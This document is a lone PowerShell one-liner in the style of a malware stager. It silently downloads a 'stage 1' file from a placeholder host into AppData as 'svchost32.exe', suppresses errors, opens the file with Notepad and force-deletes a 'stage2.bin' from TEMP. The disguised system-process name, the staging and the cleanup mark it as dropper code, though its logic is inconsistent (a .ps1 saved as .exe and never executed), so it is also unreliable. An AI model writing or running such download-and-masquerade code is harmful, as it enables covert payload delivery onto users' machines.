
$Stage1Url = 'https://example.net:8443/updater.ps1'; $DownloadPath = "$env:APPDATA\svchost32.exe"; Invoke-WebRequest -Uri $Stage1Url -OutFile $DownloadPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "notepad.exe" -ArgumentList $DownloadPath -ErrorAction SilentlyContinue; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
